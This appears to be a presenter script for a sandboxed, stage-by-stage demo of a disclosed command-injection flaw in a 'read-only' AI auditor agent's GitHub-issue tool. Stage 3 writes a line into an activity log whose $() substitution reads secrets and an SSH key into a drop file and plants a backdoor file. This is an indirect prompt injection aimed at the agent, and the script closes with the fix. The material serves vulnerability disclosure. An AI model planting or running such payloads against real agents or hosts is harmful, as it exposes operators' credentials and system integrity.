#!/usr/bin/env bash
# ===========================================================================
# LIVE, STAGE-BY-STAGE demo of GHSA-v7q6-5mpg-q47w
#   crewly "Auditor" agent  —  command injection in create_github_issue  →  host RCE
#
# You drive it: each stage pauses and waits for you to press Enter, so you can
# talk the audience through it. Ctrl-C any time; a throwaway sandbox is cleaned up.
#
# Safe by construction: benign payloads, MOCK (fake) secrets, no network, and an
# isolated temp HOME + work dir. The vulnerability logic in poc.src.mjs /
# exfil-poc.src.mjs is UNCHANGED from the published PoC — this script only drives it.
# (macOS has no bubblewrap, so the Linux /work mount is rewritten to a temp dir.)
# ===========================================================================
set -u

B=$'\033[1m'; DIM=$'\033[2m'; CY=$'\033[36m'; GR=$'\033[32m'; RD=$'\033[31m'; YL=$'\033[33m'; N=$'\033[0m'
P() { printf '%s\n' "$*"; }

# --- the framework-hunter banner (figlet 'smslant', kept in logo.txt) --------
banner() {
  local bar logo; bar=$(printf '─%.0s' $(seq 1 76))
  logo="$DIR/logo.txt"
  P ""
  P "${RD}  ◎${DIM}${bar}${RD}◎${N}"
  if [ -r "$logo" ]; then printf '%s' "$B$CY"; cat "$logo"; printf '%s' "$N"
  else P "${B}${CY}  framework-hunter${N}"; fi
  P "${DIM}          agent-framework vulnerability research   ·   live exploit PoC${N}"
  P "${RD}  ◎${DIM}${bar}${RD}◎${N}"
}

# --- wait for the presenter to press Enter (reads the real terminal) --------
wait_enter() { { IFS= read -r _ < /dev/tty; } 2>/dev/null || IFS= read -r _ || true; }
gate() {
  local msg="${1:-press ⏎ to continue}"
  printf '\n%s  ▸ %s%s' "$DIM" "$msg" "$N"
  wait_enter
  printf '\n'
}
# --- the plan: a step tracker drawn at every stage, current step highlighted -
STEP_LABELS=(
  "Find the flaw in create_github_issue"
  "Prove \$() in a title runs on the host"
  "Plant the attacker's line (indirect injection)"
  "Fire — Auditor leaks secrets & writes a backdoor"
)
roadmap() {
  local cur=$1 i mark rowcol
  P "${DIM}  ┃${N} ${B}THE PLAN${N}"
  P "${DIM}  ┃${N}"
  for i in 1 2 3 4; do
    if   [ "$i" -lt "$cur" ]; then mark="✓"; rowcol="$DIM"      # done
    elif [ "$i" -eq "$cur" ]; then mark="▶"; rowcol="$B$CY"     # now
    else                           mark="·"; rowcol="$DIM"      # pending
    fi
    printf "${DIM}  ┃${N} ${rowcol}%s  Step %d — %s${N}\n" "$mark" "$i" "${STEP_LABELS[$((i-1))]}"
  done
}
# --- stage header: the plan, then the current step's title ------------------
stage() {
  P ""; roadmap "$1"; P ""
  P "${B}${CY}  ▸ STAGE $1 · $2${N}"
  P "${DIM}  ────────────────────────────────────────────────────────────────────${N}"
}
say() { P "  $*"; }
# --- show a command as if typed, wait, then run it --------------------------
cmd() {
  printf '%s  $ %s%s' "$YL" "$*" "$N"
  wait_enter
  printf '\n'
  eval "$*"
}

DIR="$(cd "$(dirname "$0")" && pwd)"

# --- isolated throwaway environment -----------------------------------------
SANDBOX="$(mktemp -d /tmp/crewly-demo.XXXXXX)"
export HOME="$SANDBOX/home"; WORK="$SANDBOX/work"
mkdir -p "$HOME" "$WORK"
trap 'rm -rf "$SANDBOX"' EXIT
sed "s#/work#$WORK#g" "$DIR/poc.src.mjs"       > "$WORK/poc.mjs"
sed "s#/work#$WORK#g" "$DIR/exfil-poc.src.mjs" > "$WORK/exfil-poc.mjs"
# `gh` resolves but fails (no token / no network): proves the injection runs even
# when gh itself never works. Its noisy shell-parse errors are filtered for clarity.
mkdir -p "$WORK/bin"
printf '#!/bin/sh\necho "gh: not authenticated (no token / no network)" >&2; exit 1\n' > "$WORK/bin/gh"
chmod +x "$WORK/bin/gh"
export PATH="$WORK/bin:$PATH"
quiet() { grep -v -e 'unexpected EOF' -e 'syntax error: unexpected end of file' -e '^/bin/sh:'; }

# ===========================================================================
clear
banner
P ""
P "${B}${CY}  crewly — Auditor agent : command injection → host RCE${N}"
P "${DIM}  GHSA-v7q6-5mpg-q47w   ·   crewly-agent v1.20.470   ·   published 2026-11-04${N}"
P ""
say "The crewly ${B}\"Auditor\"${N} is a monitoring agent. Its own source documents it as"
say "${B}read-only, \"without any ability to modify system state,\"${N} with ${B}no shell tool.${N}"
say "Over these four stages we make it read the operator's secrets and write to disk."
P ""
say "${DIM}Sandbox for this demo (all fake, cleaned up on exit):${N}"
say "${DIM}  HOME = $HOME${N}"
say "${DIM}  WORK = $WORK${N}"
gate "press ⏎ to begin"

# --------------------------------------------------------------------------
stage 1 "The flaw — how create_github_issue builds its command"
say "The Auditor files issues with the \`gh\` CLI. It builds the command by splicing"
say "the issue ${B}title${N} into a shell string and running it with execSync:"
P ""
P "${DIM}    packages/crewly-agent/src/runtime/auditor-tools.ts${N}"
P ""
P "${GR}      execSync(\`gh issue create --title \"\${ title.replace(/\"/g,'\\\\\"') }\" ...\`)${N}"
P "${GR}                                         └─────────────┬─────────────┘${N}"
P "${GR}                              the ONLY sanitisation: escape double-quotes${N}"
P ""
say "A double-quote is escaped — but ${RD}\$( ), backticks and ;${N} are not. Any of those"
say "in the title is interpreted by ${B}/bin/sh${N}. The title is model / data controlled,"
say "so whoever controls the title controls the shell."
gate "press ⏎ for Stage 2"

# --------------------------------------------------------------------------
stage 2 "Minimal proof — does \$() in a title actually execute?"
say "poc.mjs calls the tool with a title containing a benign ${B}\$(touch CANARY)${N}."
say "If the shell evaluates it, a CANARY_PWNED file appears. (A second, benign title"
say "in the same file creates nothing — the control case.)"
rm -f "$WORK/CANARY_PWNED"
cmd "node $WORK/poc.mjs 2>&1 | quiet"
P ""
say "${DIM}\`gh\` failed to authenticate, as expected. Now — did the \$() run?${N}"
cmd "ls -l $WORK/CANARY_PWNED"
P ""
if [ -f "$WORK/CANARY_PWNED" ]; then
  say "${B}${RD}The canary exists.${N} The \$() inside the issue title executed on the host."
fi
gate "press ⏎ for Stage 3"

# --------------------------------------------------------------------------
stage 3 "Realistic trigger — indirect prompt injection"
say "The Auditor doesn't invent titles — it ${B}derives them from activity it reviews${N}"
say "(logs, commit messages, task notes) and files issues automatically. So an attacker"
say "never touches the tool; they just plant one line of text where the Auditor reads."
P ""
say "${B}First, the operator secrets a read-only agent must never reach${N} (all FAKE):"
mkdir -p "$HOME/.crewly" "$HOME/.ssh"
cat > "$HOME/.crewly/secrets.env" <<'SECRETS'
CREWLY_API_TOKEN=sk-FAKE-crewly-DO-NOT-USE-0000000000000000
GITHUB_TOKEN=ghp_FAKE0000000000000000000000000000000000
OPENAI_API_KEY=sk-FAKE-openai-0000000000000000000000000000
SECRETS
printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' 'MOCK-KEY-NOT-REAL-do-not-use' '-----END OPENSSH PRIVATE KEY-----' > "$HOME/.ssh/id_ed25519"
cmd "cat \$HOME/.crewly/secrets.env"
P ""
say "${B}Now the attacker's line${N}, sitting in an activity log the Auditor will read."
say "The \$() reads those secrets into a drop file and writes a backdoor marker:"
cat > "$WORK/audited-activity.log" <<LOG
agent coder-1 note [Critical] auth bypass \$(cat \$HOME/.crewly/secrets.env \$HOME/.ssh/id_ed25519 > $WORK/EXFIL.txt; echo pwned-by-auditor > \$HOME/.crewly/backdoor)
LOG
P ""
P "${DIM}  audited-activity.log:${N}"
fold -s -w 68 "$WORK/audited-activity.log" | sed 's/^/    /'
gate "press ⏎ for Stage 4"

# --------------------------------------------------------------------------
stage 4 "Fire — the Auditor auto-files the issue"
say "exfil-poc.mjs does what the Auditor does: read the log, derive the title from the"
say "[Critical] line, and call create_github_issue on it — no shell tool involved."
rm -f "$WORK/EXFIL.txt" "$HOME/.crewly/backdoor"
cmd "node $WORK/exfil-poc.mjs 2>&1 | quiet"
P ""
say "${DIM}Again \`gh\` never authenticated. And yet:${N}"
gate "press ⏎ to reveal the impact"
P ""
P "${RD}${B}  CONFIDENTIALITY — operator secrets copied out to EXFIL.txt:${N}"
sed 's/^/      /' "$WORK/EXFIL.txt"
P ""
P "${RD}${B}  INTEGRITY — a file written to disk, \$HOME/.crewly/backdoor:${N}"
P "      $(cat "$HOME/.crewly/backdoor")"
P ""
P "${DIM}  ────────────────────────────────────────────────────────────────────${N}"
say "A ${B}\"read-only\" agent with no shell tool${N} just read the operator's secrets and"
say "wrote to disk — through nothing but the ${B}title${N} of a GitHub issue."
P ""
say "${B}Root cause:${N} untrusted text concatenated into a shell command."
say "${B}Fix:${N} pass args as an argv array — ${GR}execFileSync('gh', ['issue','create', …])${N}"
say "      so nothing in the title is ever parsed by a shell."
P ""
P "${DIM}  GHSA-v7q6-5mpg-q47w · CVE pending${N}"
gate "press ⏎ to finish (sandbox is wiped)"
P ""
